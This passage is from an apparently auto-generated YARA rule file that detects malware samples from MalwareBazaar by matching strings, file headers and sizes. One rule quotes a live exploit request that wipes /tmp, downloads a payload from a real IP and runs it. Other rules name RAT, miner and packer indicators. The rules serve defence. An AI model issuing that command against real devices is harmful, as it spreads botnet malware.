        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 114KB and
        all of them
}

rule Windows_c444868d4cbbecd4c7083de14310fcc934d9e60a2c41de4a30057044acd9b962
{
    meta:
        description = "Auto ML: c444868d4cbbecd4c7083de14310fcc934d9e60a2c41de4a30057044acd9b962"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB and
        all of them
}

rule Windows_c446eb82797e5fcef2305c4582f911ba0d7d4ef20f20356a5cac987dd7d3d13f
{
    meta:
        description = "Auto ML: c446eb82797e5fcef2305c4582f911ba0d7d4ef20f20356a5cac987dd7d3d13f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "-The lower bound of target array must be zero."
        $s6 = "MTarget array type is not compatible with the type of items in the collection."
        $s7 = "ECannot create file because the specified file name is already in use."
        $s8 = "!Buffer offset cannot be negative."
        $s9 = "Compound File API failure."
        $s10 = "UObject used as metadata key must be an instance of the CompoundFileMetadataKey class."
        $s11 = "DCannot perform this operation when the package is in read-only mode."
        $s12 = "OFailed to read a stream type table - the data appears to be a different format."
        $s13 = "7CompoundFileReference: Corrupted CompoundFileReference."
        $s14 = "ZCompoundFileReference: Corrupted CompoundFileReference - multiple stream components found."
        $s15 = "jCompoundFileReference: Corrupted CompoundFileReference - storage component cannot follow stream component."
        $s16 = "4Cannot create data storage because access is denied."
        $s17 = "!Cannot create a read-only stream."
        $s18 = "0Cannot create new package on a read-only stream."
        $s19 = ".Cannot create a stream in a read-only package."
        $s20 = "2Cannot create StorageRoot on a nonreadable stream."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 911KB and
        all of them
}

rule Windows_1418f1140e1930a40b4dd22279c4448e44085ea3ccf0e29dccfc66cbd1b3006b
{
    meta:
        description = "Auto ML: 1418f1140e1930a40b4dd22279c4448e44085ea3ccf0e29dccfc66cbd1b3006b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "ThreadSafeObjectProvider`1"
        $s6 = "kernel32"
        $s7 = "Microsoft.Win32"
        $s8 = "user32"
        $s9 = "<Module>"
        $s10 = "GetWindowTextLengthA"
        $s11 = "GetVolumeInformationA"
        $s12 = "capGetDriverDescriptionA"
        $s13 = "GetWindowTextA"
        $s14 = "FindWindowA"
        $s15 = "GetL"
        $s16 = "System.IO"
        $s17 = "SWP_HIDEWINDOW"
        $s18 = "SWP_SHOWWINDOW"
        $s19 = "Create__Instance__"
        $s20 = "DownloadData"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 46KB and
        all of them
}

rule Windows_c46e21416616c059a9b0d50a3a4f0250b54abf8e23a1ea916220f2e365b41d4c
{
    meta:
        description = "Auto ML: c46e21416616c059a9b0d50a3a4f0250b54abf8e23a1ea916220f2e365b41d4c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "PathFindFileNameA"
        $s6 = "shlwapi.dll"
        $s7 = "CloseHandle"
        $s8 = "CreateFileA"
        $s9 = "ExitProcess"
        $s10 = "GetCommandLineA"
        $s11 = "GetEnvironmentVariableA"
        $s12 = "GetFileSize"
        $s13 = "GetModuleFileNameA"
        $s14 = "GetModuleHandleA"
        $s15 = "GetProcAddress"
        $s16 = "GetProcessHeap"
        $s17 = "GetSystemDirectoryA"
        $s18 = "GetTempPathA"
        $s19 = "GetWindowsDirectoryA"
        $s20 = "LoadLibraryA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6810KB and
        all of them
}

rule Windows_c486c02faf15e3da9e9ffd8f61bca345b5ee5f1084c1236ef9529ae01ac72e7c
{
    meta:
        description = "Auto ML: c486c02faf15e3da9e9ffd8f61bca345b5ee5f1084c1236ef9529ae01ac72e7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s4 = "http://pki-ocsp.symauth.com0"
        $s5 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s6 = "kernel32.dll"
        $s7 = "user32.dll"
        $s8 = "advapi32.dll"
        $s9 = "oleaut32.dll"
        $s10 = "shell32.dll"
        $s11 = "version.dll"
        $s12 = "mscoree.dll"
        $s13 = "GetModuleHandleA"
        $s14 = "GetProcAddress"
        $s15 = "ExitProcess"
        $s16 = "LoadLibraryA"
        $s17 = "RegCloseKey"
        $s18 = "CreateFontA"
        $s19 = "ShellExecuteA"
        $s20 = "GetFileVersionInfoA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5788KB and
        all of them
}

rule Windows_c4ce370872ed6186d6a00aabb37e59936ea264bd5ee7e61bc366aa5fbbfc8cf4
{
    meta:
        description = "Auto ML: c4ce370872ed6186d6a00aabb37e59936ea264bd5ee7e61bc366aa5fbbfc8cf4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3256KB and
        all of them
}

rule Linux_c4d1725c578c93b768db14433e05a68e1068860fb28955341bdd20645698125b
{
    meta:
        description = "Auto ML: c4d1725c578c93b768db14433e05a68e1068860fb28955341bdd20645698125b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Montgomery Multiplication for ARMv8, CRYPTOGAMS by <appro@openssl.org>"
        $s2 = "GHASH for ARMv8, CRYPTOGAMS by <appro@openssl.org>"
        $s3 = "basic_string::_M_create"
        $s4 = "XMRIG_TEMP_DIR"
        $s5 = "Unexpected end of regex when reading control code."
        $s6 = "cannot create std::vector larger than max_size()"
        $s7 = "Unexpected end of regex when in an open parenthesis."
        $s8 = "Invalid special open parenthesis."
        $s9 = "Unexpected character class open bracket."
        $s10 = "Back-reference referred to an opened sub-expression."
        $s11 = "cannot create std::deque larger than max_size()"
        $s12 = "Parenthesis is not closed."
        $s13 = "%s<offset:%zu>: \"%s\""
        $s14 = "unable to open \"%s\"."
        $s15 = "[0;33m\"%s\" was changed, reloading configuration"
        $s16 = "[0;31mreloading failed"
        $s17 = "OpenSSL 1.1.1 (compatible; BoringSSL)"
        $s18 = "OpenSSL/%.*s"
        $s19 = "user-agent"
        $s20 = "log-file"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 4395KB and
        all of them
}

rule Linux_c50b9fb22b839b3119712ff166a8e7020c291b9f71c7a3e99c4e7211a0380250
{
    meta:
        description = "Auto ML: c50b9fb22b839b3119712ff166a8e7020c291b9f71c7a3e99c4e7211a0380250"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s2 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Windows_c519bde5e40e48d81a0d6bd46c72364383d75f1a5b70cda223456a00c0dfa929
{
    meta:
        description = "Auto ML: c519bde5e40e48d81a0d6bd46c72364383d75f1a5b70cda223456a00c0dfa929"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "RegSetValueExW"
        $s8 = "RegCloseKey"
        $s9 = "RegDeleteValueW"
        $s10 = "RegDeleteKeyW"
        $s11 = "OpenProcessToken"
        $s12 = "RegOpenKeyExW"
        $s13 = "RegCreateKeyExW"
        $s14 = "ADVAPI32.dll"
        $s15 = "SHFileOperationW"
        $s16 = "SHGetFileInfoW"
        $s17 = "SHGetPathFromIDListW"
        $s18 = "ShellExecuteExW"
        $s19 = "SHELL32.dll"
        $s20 = "CoCreateInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB and
        all of them
}

rule Linux_c5293f07122b212e9c0a8d978861219e7567b47fbbc6640b4b4b9f8393cf5791
{
    meta:
        description = "Auto ML: c5293f07122b212e9c0a8d978861219e7567b47fbbc6640b4b4b9f8393cf5791"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 65KB and
        all of them
}

rule Windows_c569fe7d3ccb9bf36356f829d5ab7de3ba4261d3beaffef1e690d8d197919c71
{
    meta:
        description = "Auto ML: c569fe7d3ccb9bf36356f829d5ab7de3ba4261d3beaffef1e690d8d197919c71"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_Khoa"
        $s6 = "set_Khoa"
        $s7 = "System.Data"
        $s8 = "get_Magenta"
        $s9 = "add_Load"
        $s10 = "frmThem_Load"
        $s11 = "BaoCaoBenhAn_Load"
        $s12 = "TraCuuBenhAn_Load"
        $s13 = "set_FormattingEnabled"
        $s14 = "set_DoubleBuffered"
        $s15 = "get_SelectCommand"
        $s16 = "set_SelectCommand"
        $s17 = "CreateInstance"
        $s18 = "set_DataSource"
        $s19 = "get_KeyCode"
        $s20 = "set_AutoScaleMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 812KB and
        all of them
}

rule Windows_c5a97c768e7ba609346fe283ab8be115e1279edd50e672a89eaa9c1693cf4df6
{
    meta:
        description = "Auto ML: c5a97c768e7ba609346fe283ab8be115e1279edd50e672a89eaa9c1693cf4df6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetWindowsVersion>g__HKLM_GetString|11_0"
        $s5 = "<GetScanArgs>b__5_0"
        $s6 = "Microsoft.Win32"
        $s7 = "<GetTokens>d__2"
        $s8 = "<Module>"
        $s9 = "System.Drawing.Drawing2D"
        $s10 = "get_ReleaseID"
        $s11 = "set_ReleaseID"
        $s12 = "get_TaskID"
        $s13 = "set_TaskID"
        $s14 = "get_ASCII"
        $s15 = "get_JSON"
        $s16 = "get_ScanVPN"
        $s17 = "set_ScanVPN"
        $s18 = "System.IO"
        $s19 = "get_BlockedIP"
        $s20 = "set_BlockedIP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 96KB and
        all of them
}

rule Windows_c5bd3735647c42104f1dec6e8deb9a7eba8d0e89302d98baa8089cfb614d5536
{
    meta:
        description = "Auto ML: c5bd3735647c42104f1dec6e8deb9a7eba8d0e89302d98baa8089cfb614d5536"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 294KB and
        all of them
}

rule Windows_144ac8ff50960640a4fa31c209b07da62e7d11635d1525a43da3a1b7edee982b
{
    meta:
        description = "Auto ML: 144ac8ff50960640a4fa31c209b07da62e7d11635d1525a43da3a1b7edee982b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "I7ndDyTcHgH5cySEtJzutGtFpqixIKcAM51gx2EYisSF"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "TargetFrameworkAttribute"
        $s8 = "System.Runtime.Versioning"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "System.Core"
        $s11 = "System.Diagnostics"
        $s12 = "<Module>"
        $s13 = "d51GeNyP0TEUCMd8SX"
        $s14 = "System.IO"
        $s15 = "<Module>{9AD853F1-9F96-42CA-A6CF-16FBB2BD894A}"
        $s16 = "System.Text"
        $s17 = "get_Length"
        $s18 = "get_Chars"
        $s19 = "System.Collections.Generic"
        $s20 = "System.Linq"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1817KB and
        all of them
}

rule Linux_c5c2ed7645917b3f43af4f1bf53bbdc7bf60c8fda30839dcc1b9178ebd7ccf3b
{
    meta:
        description = "Auto ML: c5c2ed7645917b3f43af4f1bf53bbdc7bf60c8fda30839dcc1b9178ebd7ccf3b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "PATCH /%s HTTP/1.1"
        $s5 = "User-Agent: %s"
        $s6 = "Connection: close"
        $s7 = "OpenSuse"
        $s8 = "OpenWRT"
        $s9 = "No such file or directory"
        $s10 = "No such process"
        $s11 = "Interrupted system call"
        $s12 = "Bad file descriptor"
        $s13 = "No child processes"
        $s14 = "Resource temporarily unavailable"
        $s15 = "File exists"
        $s16 = "Too many open files in system"
        $s17 = "Too many open files"
        $s18 = "Text file busy"
        $s19 = "File too large"
        $s20 = "Read-only file system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 106KB and
        all of them
}

rule Windows_c5c52c8d7ac7465aa7ac0e8929b1e08985443facdedbe5751e69087e9ae3010b
{
    meta:
        description = "Auto ML: c5c52c8d7ac7465aa7ac0e8929b1e08985443facdedbe5751e69087e9ae3010b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1172KB and
        all of them
}

rule Windows_c6164f6ee46e8c590f88177b10d6e1fe2f1a4f3b5d4f7944c2cec12f5ae66835
{
    meta:
        description = "Auto ML: c6164f6ee46e8c590f88177b10d6e1fe2f1a4f3b5d4f7944c2cec12f5ae66835"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "GetConsoleWindow"
        $s8 = "ShowWindow"
        $s9 = "System.Collections.ObjectModel"
        $s10 = "System.Management.Automation"
        $s11 = "System.IO"
        $s12 = "nCmdShow"
        $s13 = "System.Reflection"
        $s14 = "System.Runtime.InteropServices"
        $s15 = "AssemblyFileVersionAttribute"
        $s16 = "System.Runtime.CompilerServices"
        $s17 = "kernel32.dll"
        $s18 = "user32.dll"
        $s19 = "System.Diagnostics"
        $s20 = "Process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 13KB and
        all of them
}

rule Windows_c62a19295b0e7fe56135d786dad65b1e2773eea90733799c0e068bd11bdaaa47
{
    meta:
        description = "Auto ML: c62a19295b0e7fe56135d786dad65b1e2773eea90733799c0e068bd11bdaaa47"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "ThreadSafeObjectProvider`1"
        $s6 = "System"
        $s7 = "get_Computer"
        $s8 = "get_Application"
        $s9 = "User"
        $s10 = "get_User"
        $s11 = "m_UserObjectProvider"
        $s12 = "get_WebServices"
        $s13 = "GetHashCode"
        $s14 = "GetType"
        $s15 = "Create__Instance__"
        $s16 = "get_GetInstance"
        $s17 = "m_ThreadStaticValue"
        $s18 = "GetInstance"
        $s19 = "System.Text"
        $s20 = "user32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 27KB and
        all of them
}

rule Windows_c62f077bf99d737fe7ade6270c8839ad7088d0b93c06943fa5ee38501ef93208
{
    meta:
        description = "Auto ML: c62f077bf99d737fe7ade6270c8839ad7088d0b93c06943fa5ee38501ef93208"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "ProcessPH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = ":windu"
        $s17 = "8windu fA"
        $s18 = "8open"
        $s19 = "9fileu"
        $s20 = ">fileuF"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 10074KB and
        all of them
}

rule Windows_c64219142bff5748f64bce31830bb29ed247e4adf3fd5ad493358728b4486ff6
{
    meta:
        description = "Auto ML: c64219142bff5748f64bce31830bb29ed247e4adf3fd5ad493358728b4486ff6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 3829KB and
        all of them
}

rule Windows_c6a30981874e6e77249a6737abb1194158562bd90d76351b859f9acaee09748b
{
    meta:
        description = "Auto ML: c6a30981874e6e77249a6737abb1194158562bd90d76351b859f9acaee09748b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GameSettingsForm_Load_1"
        $s5 = "get_Item1"
        $s6 = "get_Player1"
        $s7 = "get_Item2"
        $s8 = "get_Player2"
        $s9 = "<Module>"
        $s10 = "get_NPzL"
        $s11 = "getInstancia"
        $s12 = "get_paginaWebEmpresa"
        $s13 = "set_paginaWebEmpresa"
        $s14 = "get_razonSocialEmpresa"
        $s15 = "set_razonSocialEmpresa"
        $s16 = "get_direccionEmpresa"
        $s17 = "set_direccionEmpresa"
        $s18 = "get_correoEmpresa"
        $s19 = "set_correoEmpresa"
        $s20 = "get_telefonoEmpresa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 965KB and
        all of them
}

rule Linux_c6ed76defdbb31ec7652fc792d94c33dfbecfbfdeaf9818a62b3095e52785d6a
{
    meta:
        description = "Auto ML: c6ed76defdbb31ec7652fc792d94c33dfbecfbfdeaf9818a62b3095e52785d6a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 35KB and
        all of them
}

rule Windows_c6f6a21328d5e291f331c4283fb3d4ed13499a1de87f773734c09ba0ccbd72be
{
    meta:
        description = "Auto ML: c6f6a21328d5e291f331c4283fb3d4ed13499a1de87f773734c09ba0ccbd72be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 981KB and
        all of them
}

rule Linux_c716bedd906bb5ac14606e0eab0c4fab90c4e95250972257bf3bf0957159edd8
{
    meta:
        description = "Auto ML: c716bedd906bb5ac14606e0eab0c4fab90c4e95250972257bf3bf0957159edd8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 21KB and
        all of them
}

rule Linux_144ef7d3bc81a112bb4bcdc08344b8009a4566262cb9469035aa7e71134cba79
{
    meta:
        description = "Auto ML: 144ef7d3bc81a112bb4bcdc08344b8009a4566262cb9469035aa7e71134cba79"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s5 = "Connection: keep-alive"
        $s6 = "GET /shell?cd+/tmp;rm+-rf+*;wget+ 157.90.250.90/jaws;sh+/tmp/jaws HTTP/1.1"
        $s7 = "User-Agent: Hello, world"
        $s8 = "jic|[setme"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 65KB and
        all of them
}

rule Windows_c728f7d571ce5633fe6c3ee6f2a66c6ba33a9ee8261e9a20bab7a9fccbc3fb42
{
    meta:
        description = "Auto ML: c728f7d571ce5633fe6c3ee6f2a66c6ba33a9ee8261e9a20bab7a9fccbc3fb42"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".rsrc"
        $s6 = "SetThreadPreferredUILanguages"
        $s7 = "kernel32"
        $s8 = "SetProcessPreferredUILanguages"
        $s9 = "GetNativeSystemInfo"
        $s10 = "Could not overwrite file \"%s\"."
        $s11 = "Could not create file \"%s\"."
        $s12 = "No \"HelpText\" in the configuration file."
        $s13 = "\"setup.exe\""
        $s14 = "Could not find \"setup.exe\"."
        $s15 = "Could not delete file or folder \"%s\"."
        $s16 = "Could not create folder \"%s\"."
        $s17 = "Could not write SFX configuration."
        $s18 = "Could not read SFX configuration or configuration not found."
        $s19 = "Could not open archive file \"%s\"."
        $s20 = "Could not get SFX filename."
    condition:
        uint32(0) == 0x00605a4d and
        filesize < 3023KB and
        all of them
}

rule Windows_c736d5dcb526ba8db53db123fd2e547d478669edff900559766e434dc7fc6782
{
    meta:
        description = "Auto ML: c736d5dcb526ba8db53db123fd2e547d478669edff900559766e434dc7fc6782"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
